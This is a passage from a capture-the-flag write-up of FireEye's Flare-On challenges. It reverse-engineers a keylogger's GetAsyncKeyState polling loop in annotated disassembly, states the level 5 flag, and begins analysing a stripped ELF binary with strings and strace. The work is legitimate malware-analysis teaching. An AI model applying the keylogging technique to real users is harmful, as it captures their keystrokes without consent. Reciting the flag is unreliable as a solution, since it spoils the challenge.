<p><img src="/images/2014/flare/5-4.jpg" alt="1000A4C0" title="1000A4C0" /></p>

<p>Inside <code>sub_1000A4C0</code> we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let&rsquo;s look at the other branch.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>sub_1000A4C0</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4D3</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_rand</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4D8</span> <span style="color: #268BD2">cdq</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4D9</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0C8h</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4DE</span> <span style="color: #268BD2">idiv</span>    <span style="color: #B58900">ecx</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4E0</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">32h</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4E3</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_10</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">edx</span>    <span style="color: #586E75">; var_10 = size of array of type size_t</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4E6</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_10</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4E9</span> <span style="color: #268BD2">imul</span>    <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Fh</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4EC</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">edx</span>             <span style="color: #586E75">; size_t</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4ED</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_malloc</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4F2</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4F5</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_C</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span> <span style="color: #586E75">; pointer to allocated memory</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4F8</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_10</span><span style="color: #93A1A1">]</span>    <span style="color: #586E75">; eax = size of array</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4FB</span> <span style="color: #268BD2">imul</span>    <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Fh</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4FE</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; size_t</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A4FF</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">0</span>               <span style="color: #586E75">; int</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A501</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_C</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A504</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ecx</span>             <span style="color: #586E75">; void *</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A505</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">_memset</span>         <span style="color: #586E75">; Initialize array with 0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A50A</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0Ch</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A50D</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">0Ah</span>             <span style="color: #586E75">; dwMilliseconds</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A50F</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">Sleep</span>        <span style="color: #586E75">; Sleep for 10 miliseconds</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A515</span> <span style="color: #268BD2">xor</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">edx</span>        <span style="color: #586E75">; edx = 0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A517</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_8</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">dx</span> <span style="color: #586E75">; var_8 = 0</span>

<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A51B</span> <span style="color: #268BD2">loc_1000A51B</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A51B</span> <span style="color: #268BD2">movsx</span>   <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_8</span><span style="color: #93A1A1">]</span>   <span style="color: #586E75">; eax = 0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A51F</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_10</span><span style="color: #93A1A1">]</span>  <span style="color: #586E75">; if (0 =&gt; size of array) </span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A522</span> <span style="color: #268BD2">jge</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A554</span> <span style="color: #586E75">; if (no memory was allocated) - jump to loc_1000A554</span>

<span style="color: #586E75">; if memory was allocated</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A524</span> <span style="color: #268BD2">push</span>    <span style="color: #2AA198">0Ah</span>             <span style="color: #586E75">; dwMilliseconds</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A526</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">Sleep</span>        <span style="color: #586E75">; Sleep for 10 miliseconds</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A52C</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_10009EB0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A531</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_14</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">eax</span>    <span style="color: #586E75">; var_14 = sub_10009EB0()</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A534</span> <span style="color: #268BD2">cmp</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_14</span><span style="color: #93A1A1">],</span> <span style="color: #2AA198">0</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A538</span> <span style="color: #268BD2">jz</span>      <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A55</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>Line 1 calls <code>rand</code> and the result is modified a few times by doing some calculations in lines 3-8. In line 9, it is pushed to stack as argument for <code>malloc</code>. So a random number of bytes are allocated. Seems like it is allocating an array of type <code>size_t</code>. This is reinforced because the number is multiplied by 16 (size of size_t) in line 8 before being pushed to the stack. After the <code>malloc</code>, the pointer to the allocated memory is stored in <code>var_C</code>. In lines 13-19 we see that this array is reset to zero by <code>memset</code>. Line 22 calls sleep with 10 miliseconds. Last line compares the calculated size of array with 0 and if so then no memory was allocated and program jumps back to the start of the function and tries to allocate memory and initialize memory again. If memory was allocated we continue to line 32 sleep for 10 miliseconds and call <code>sub_10009EB0</code>.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>sub_10009EB0</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB0</span> <span style="color: #268BD2">sub_10009EB0</span> <span style="color: #268BD2">proc</span> <span style="color: #268BD2">near</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB0</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB0</span> <span style="color: #268BD2">var_8</span><span style="color: #93A1A1">=</span> <span style="color: #DC322F">dword</span> <span style="color: #268BD2">ptr</span> <span style="color: #719e07">-</span><span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB0</span> <span style="color: #268BD2">var_4</span><span style="color: #93A1A1">=</span> <span style="color: #DC322F">word</span> <span style="color: #268BD2">ptr</span> <span style="color: #719e07">-</span><span style="color: #2AA198">4</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB0</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB0</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">ebp</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB1</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">ebp</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">esp</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB3</span> <span style="color: #268BD2">sub</span>     <span style="color: #B58900">esp</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EB6</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">8</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EBB</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">ax</span>   <span style="color: #586E75">; var_4 = 0</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EBF</span> <span style="color: #268BD2">jmp</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_10009ECD</span>

<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">ECD</span> <span style="color: #268BD2">loc_10009ECD</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">ECD</span> <span style="color: #268BD2">movsx</span>   <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">ED1</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">edx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0DEh</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">ED7</span> <span style="color: #268BD2">jg</span>      <span style="color: #268BD2">loc_1000A3A4</span> <span style="color: #586E75">; if var_4 &gt; 222 (0xDE) jump to loc_1000A3A4</span>

<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EDD</span> <span style="color: #268BD2">movsx</span>   <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EE1</span> <span style="color: #268BD2">push</span>    <span style="color: #B58900">eax</span>             <span style="color: #586E75">; vKey</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EE2</span> <span style="color: #268BD2">call</span>    <span style="color: #B58900">ds</span><span style="color: #93A1A1">:</span><span style="color: #268BD2">GetAsyncKeyState</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EE8</span> <span style="color: #268BD2">movsx</span>   <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #B58900">ax</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EEB</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">ecx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">0FFFF8001h</span> <span style="color: #586E75">; check if vKey was pressed</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EF1</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">loc_1000A39F</span>    <span style="color: #586E75">; jumptable 1000A2D4 default case</span>

<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A39F</span> <span style="color: #268BD2">loc_1000A39F</span><span style="color: #93A1A1">:</span>           <span style="color: #586E75">; jumptable 1000A2D4 default case</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A39F</span> <span style="color: #268BD2">jmp</span>     <span style="color: #268BD2">loc_10009EC1</span>

<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EC1</span> <span style="color: #268BD2">loc_10009EC1</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EC1</span> <span style="color: #268BD2">mov</span>     <span style="color: #B58900">cx</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EC5</span> <span style="color: #268BD2">add</span>     <span style="color: #B58900">cx</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">1</span>
<span style="color: #93A1A1">.text:10009</span><span style="color: #268BD2">EC9</span> <span style="color: #268BD2">mov</span>     <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">],</span> <span style="color: #B58900">cx</span> <span style="color: #586E75">; (var_4)++</span>
<span style="color: #586E75">; go back to line 14</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>This is what we are looking for. First <code>var_4</code> is set to 0 in line 10, then it is compared with 222 in lines 15-16 . If it is larger, we jump to <code>loc_1000A3A4</code>.</p>

<p>If not we will reach line 18 where <code>var_4</code> (initially 0) is stored in eax and pushed to stack as parameter for <code>GetAsyncKeyState</code>. We already know what this function does. If <code>vKey</code> has been pressed since last call to <code>GetAsyncKeyState</code>, it will return a value. Otherwise it will return 0. This <a href="http://reversing.be/forum/viewtopic.php?t=628&amp;sid=bf0d5e83ef43f1c34c41cd5cd2793a76" target="_blank">forum thread from 2007</a> discusses this usecase.<br />
If the key was not pressed, we jump to line 26 and then 29 where <code>var_4</code> is increased by 1. Then we go back to line 14 where <code>var_4</code> is compared with 222 and the cycle is repeated.</p>

<p>Now we know that the application loops through ascii characters from 0 to 222 checking to see if a key was pressed. If so we will not jump at line 23 and continue. Let&rsquo;s take a look at that.</p>

<p><img src="/images/2014/flare/5-5.jpg" alt="Key pressed" title="Key pressed" /></p>

<p>This code is a series of cases for a switch statement (as IDA has detected). It checks what key was pressed performs specific actions for each key (taking the red arrows). It checks from <code>0x27</code> to <code>0x60</code>. By looking at an ASCII table, we can see that the application checks for some special characters, number and letters. I am not going to describe what each one does but I went through each function and looked at the code. Most of them were the same and looked uninteresting but the function for <code>M</code> or <code>0x4D</code> caught my eye. Finding the code for <code>M</code> and clicking on the red arrow besides it.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>If M is pressed</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A1B6</span> <span style="color: #268BD2">loc_1000A1B6</span><span style="color: #93A1A1">:</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A1B6</span> <span style="color: #268BD2">movsx</span>   <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #93A1A1">[</span><span style="color: #B58900">ebp</span><span style="color: #719e07">+</span><span style="color: #268BD2">var_4</span><span style="color: #93A1A1">]</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A1BA</span> <span style="color: #268BD2">cmp</span>     <span style="color: #B58900">eax</span><span style="color: #93A1A1">,</span> <span style="color: #2AA198">4Dh</span>
<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A1BD</span> <span style="color: #268BD2">jnz</span>     <span style="color: #268BD2">short</span> <span style="color: #268BD2">loc_1000A1C9</span>

<span style="color: #93A1A1">.text:1000</span><span style="color: #268BD2">A1BF</span> <span style="color: #268BD2">call</span>    <span style="color: #268BD2">sub_10009AF0</span>
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>What is <code>sub_10009AF0</code>?</p>

<p><img src="/images/2014/flare/5-6.jpg" alt="sub10009Af0" title="sub10009AF0" /></p>

<p>Nice, IDA has even tagged it as M for us. First we see that a <code>dword_10017000</code> is compared to 0. and if it is larger than 0, two functions are called: <code>__cfltcvt_init</code> and <code>sub_10001240</code>. Then returns with value <code>m</code>.</p>

<p><img src="/images/2014/flare/5-7.jpg" alt="__cfltcvt_init" title="__cfltcvt_init" /></p>

<p><code>__cfltcvt_init</code> sets one variable to 1 and resets the rest (including <code>dword_10017000</code>).</p>

<p><code>sub_10001240</code> creates a large array, initializes it with some values and then calles <code>GetWindowLong</code> and <code>DialogBoxIndirectParam</code>. I put a breakpoint in the end. Change the IP to the start of this function and ran the program.</p>

<p><img src="/images/2014/flare/5-8.jpg" alt="ASCII Flare" title="ASCII Flare" /></p>

<p>Nice! So to get this ASCII art we have to press M and <code>dword_10017000</code> needs to be 0. Let&rsquo;s get back to <code>sub_10009AF0</code> and investigate <code>dword_10017000</code>.</p>

<p>Highlight <code>dword_10017000</code> and press <code>x</code> in IDA to see where this variable is being set to 1 (which will make the if true). There is only one place.</p>

<p><img src="/images/2014/flare/5-9.jpg" alt="Where M is set" title="Where M is set" /></p>

<p>Notice the <code>o</code>? Now see that variable <code>dword_100194F8</code> needs to be 1 to reach this line (top right). Follow that using <code>x</code>.</p>

<p>So we have <code>m</code> and then <code>o</code>. If we follow the chain and then reverse it, we have the flag. The binary is a keylogger, it saves all keystrokes to <code>svchost.log</code>.</p>

<h4 id="level-5-flag-l0gging-ur-5tr0ke5-flare-on-com:94bf06dd1bee42f6b34a1ff79274f7e7">Level 5 flag: l0gging.Ur.5tr0ke5@flare-on.com</h4>

<hr />

<h2 id="a-name-ch6-a-challenge-6-ida-appreciation-day:94bf06dd1bee42f6b34a1ff79274f7e7"><a name="ch6"></a> Challenge 6 - IDA Appreciation Day</h2>
<div class="highlight" style="background: #002B36"><pre style="line-height: 125%">Great success!
We&#39;ve got another evil one for you, see if you can figure this out. This one will be rougher. Good luck!
-FLARE
</pre></div>

<p>While I was writing this solution, I saw this alternative way of solving the challenge. Great read: <a href="http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html" target="_blank">Solving FireEye&rsquo;s Flare On Six via Side Channels</a>.</p>

<p>New binary. Named <code>e7bc5d2c0cf4480348f5504196561297</code>. Let&rsquo;s google it and <a href="http://pedump.me/e7bc5d2c0cf4480348f5504196561297/" target="_blank">first result</a> is interesting. Filename has the <code>exe</code> extension but it is a 64-bit ELF executable. Opening the file in <code>HxD</code> shows us the ELF magic bytes.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Info from pedumpme</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%">1
2
3
4</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%">filename  spyEye1.4.exe
size      <span style="color: #2AA198">1221064</span> <span style="color: #719e07">(</span>0x12a1c8<span style="color: #719e07">)</span>
md5       e7bc5d2c0cf4480348f5504196561297
<span style="color: #B58900">type</span>      ELF 64-bit LSB executable, x86-64, version <span style="color: #2AA198">1</span> <span style="color: #719e07">(</span>SYSV<span style="color: #719e07">)</span>, statically linked, <span style="color: #719e07">for</span> GNU/Linux 2.6.24, BuildID<span style="color: #719e07">[</span>sha1<span style="color: #719e07">]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>I started a Kali 64-bit VM in VirtualBox. Less mess with it a bit. I used IDA Remote Linux Debugger. IDA was running on my host OS and the binary was in the Kali 64-bit VM.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>Running commands</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%"><span style="color: #586E75"># the same as the website</span>
$ file e7bc5d2c0cf4480348f5504196561297 
e7bc5d2c0cf4480348f5504196561297: ELF 64-bit LSB executable, x86-64, version <span style="color: #2AA198">1</span> <span style="color: #719e07">(</span>SYSV<span style="color: #719e07">)</span>, statically linked, <span style="color: #719e07">for</span> GNU/Linux 2.6.24, BuildID<span style="color: #719e07">[</span>sha1<span style="color: #719e07">]=</span>0xa26451c6440ccb470f9cb8cabf8069c01120086c, stripped

$ strings e7bc5d2c0cf4480348f5504196561297
<span style="color: #586E75"># results in a bunch of random strings</span>
<span style="color: #586E75"># looks like a mix of error messages, source code and random words</span>
/index.html
Nosebleed   <span style="color: #586E75"># Heartbleed eh? :)</span>
../nptl/sysdeps/unix/sysv/linux/x86_64/../fork.c
info<span style="color: #719e07">[</span>20<span style="color: #719e07">]</span>-&gt;d_un.d_val <span style="color: #719e07">==</span> 7
...

<span style="color: #586E75"># let&#39;s see shared library calls - nope</span>
$ ltrace ./e7bc5d2c0cf4480348f5504196561297 
ltrace: Couldn<span style="color: #2AA198">&#39;t find .dynsym or .dynstr in &quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>

<span style="color: #2AA198"># Let&#39;</span>s run the binary manually
<span style="color: #586E75"># running it normally</span>
$ ./e7bc5d2c0cf4480348f5504196561297 
no

<span style="color: #586E75"># one argument - different message</span>
$ ./e7bc5d2c0cf4480348f5504196561297 arg1
na

<span style="color: #586E75"># longer argument - message did not change</span>
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111
na

<span style="color: #586E75"># two arguments - message changed</span>
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2
bad

<span style="color: #586E75"># three arguments - message changed - shoule we stop?</span>
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3
stahp

<span style="color: #586E75"># four arguments - message is the same - we should stop </span>
$ ./e7bc5d2c0cf4480348f5504196561297 arg11111 arg2 arg3 arg4
stahp
</pre></div>
</td></tr></table>
  </div>
</figure>
</p>

<p>I did not try executing the binary with different number of arguments at the start. I tried different argument lengths, really long arguments (e.g. &lsquo;A&rsquo;*40000). In the end I decided that two arguments was the correct way to run the binary. While debugging I realized that the binary crashes with a segfault message. While it is fine without the debugging. So some anti-debugging protections must be at work. We ran <code>ltrace</code> and didn&rsquo;t see any shared library calls. Let&rsquo;s run <code>strace</code> to get system calls.</p>

<p>


    

<figure class="code">
  <figcaption>
  	<span>strace output</span>
  </figcaption>
  <div class="codewrapper"> 
    <table class="highlighttable"><tr><td><div class="linenodiv" style="background-color: #f0f0f0; padding-right: 10px"><pre style="line-height: 125%"> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41</pre></div></td><td class="code"><div class="highlight" style="background: #002B36"><pre style="line-height: 125%">$ strace ./e7bc5d2c0cf4480348f5504196561297
execve<span style="color: #719e07">(</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span style="color: #719e07">[</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>...<span style="color: #719e07">]</span>, <span style="color: #719e07">[</span>/* <span style="color: #2AA198">31</span> vars */<span style="color: #719e07">])</span> <span style="color: #719e07">=</span> 0
uname<span style="color: #719e07">({</span><span style="color: #268BD2">sys</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;Linux&quot;</span>, <span style="color: #268BD2">node</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;kali&quot;</span>, ...<span style="color: #719e07">})</span>  <span style="color: #719e07">=</span> 0
brk<span style="color: #719e07">(</span>0<span style="color: #719e07">)</span>                                  <span style="color: #719e07">=</span> 0x13e5000
brk<span style="color: #719e07">(</span>0x13e61c0<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x13e61c0
arch_prctl<span style="color: #719e07">(</span>ARCH_SET_FS, 0x13e5880<span style="color: #719e07">)</span>      <span style="color: #719e07">=</span> 0
brk<span style="color: #719e07">(</span>0x14071c0<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x14071c0
brk<span style="color: #719e07">(</span>0x1408000<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> 0x1408000
fstat<span style="color: #719e07">(</span>1, <span style="color: #719e07">{</span><span style="color: #268BD2">st_mode</span><span style="color: #719e07">=</span>S_IFCHR<span style="color: #93A1A1">|</span>0620, <span style="color: #268BD2">st_rdev</span><span style="color: #719e07">=</span>makedev<span style="color: #719e07">(</span>136, 0<span style="color: #719e07">)</span>, ...<span style="color: #719e07">})</span> <span style="color: #719e07">=</span> 0
mmap<span style="color: #719e07">(</span>NULL, 4096, PROT_READ<span style="color: #93A1A1">|</span>PROT_WRITE, MAP_PRIVATE<span style="color: #93A1A1">|</span>MAP_ANONYMOUS, -1, 0<span style="color: #719e07">)</span> <span style="color: #719e07">=</span> 0x7f20ba6fb000
write<span style="color: #719e07">(</span>1, <span style="color: #2AA198">&quot;no\n&quot;</span>, 3no
<span style="color: #719e07">)</span>                     <span style="color: #719e07">=</span> 3
exit_group<span style="color: #719e07">(</span>52<span style="color: #719e07">)</span>                          <span style="color: #719e07">=</span> ?

$ strace ./e7bc5d2c0cf4480348f5504196561297 arg1
execve<span style="color: #719e07">(</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f5504196561297&quot;</span>, <span style="color: #719e07">[</span><span style="color: #2AA198">&quot;./e7bc5d2c0cf4480348f55041965612&quot;</span>..., <span style="color: #2AA198">&quot;arg1&quot;</span><span style="color: #719e07">]</span>, <span style="color: #719e07">[</span>/* <span style="color: #2AA198">31</span> vars */<span style="color: #719e07">])</span> <span style="color: #719e07">=</span> 0
uname<span style="color: #719e07">({</span><span style="color: #268BD2">sys</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;Linux&quot;</span>, <span style="color: #268BD2">node</span><span style="color: #719e07">=</span><span style="color: #2AA198">&quot;kali&quot;</span>, ...<span style="color: #719e07">})</span>  <span style="color: #719e07">=</span> 0
brk<span style="color: #719e07">(</span>0<span style="color: #719e07">)</span>                                  <span style="color: #719e07">=</span> 0x18cb000
